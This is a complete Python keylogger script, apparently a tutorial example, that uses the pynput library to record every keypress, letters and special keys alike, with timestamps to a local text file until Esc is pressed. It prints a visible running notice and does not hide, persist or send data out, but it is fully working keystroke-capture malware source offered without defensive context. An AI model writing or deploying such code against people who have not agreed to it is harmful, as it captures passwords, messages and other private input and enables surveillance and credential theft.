import pynput.keyboard
import logging
from datetime import datetime

# 1. SETUP: Configure the log file
# The log file will be created in the same folder as the script
log_file = "keylog_data.txt"

logging.basicConfig(
    filename=log_file, 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    """This function triggers every time a key is pressed."""
    try:
        # Log alphanumeric keys (letters, numbers)
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (Space, Enter, Shift, etc.)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """This function triggers when a key is released."""
    # Stop the program if the 'Esc' key is pressed
    if key == pynput.keyboard.Key.esc:
        return False

# 2. EXECUTION: Start the listener
print("--- Keylogger is running... Press 'Esc' to stop ---")
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"--- Data saved to {log_file}. Program stopped. ---")
